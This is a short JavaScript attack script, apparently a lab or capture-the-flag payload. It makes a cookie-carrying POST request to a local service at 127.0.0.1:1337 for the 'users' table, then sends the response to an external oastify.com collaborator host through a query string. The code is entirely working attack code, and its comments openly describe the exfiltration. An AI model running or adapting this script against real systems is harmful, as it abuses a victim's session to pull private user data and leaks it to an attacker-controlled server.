function submitRequest() {
  const url = "http://127.0.0.1:1337/table";
  const body = JSON.stringify({ tableName: "users" });

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: body,
    credentials: "include"  // This ensures cookies are sent with the request
  })
  .then(response => {
    if (response.ok) {
      return response.json();  // Parse JSON response
    } else {
      throw new Error('Request failed with status ' + response.status);
    }
  })
  .then(data => {
    console.log("Response data:", data);

    // Exfiltrate the result to a remote server
    fetch(`https://1z1f5krsnflbw7918qzikh2bs2ytmmab.oastify.com/exfil?data==${encodeURIComponent(JSON.stringify(data))}`, {
      method: "GET",
    })
    .then(exfilResponse => {
      console.log("Exfiltration response:", exfilResponse.status);
    })
    .catch(exfilError => {
      console.error("Error exfiltrating data:", exfilError);
    });
  })
  .catch(error => {
    console.error("Error:", error);
  });
}

submitRequest();
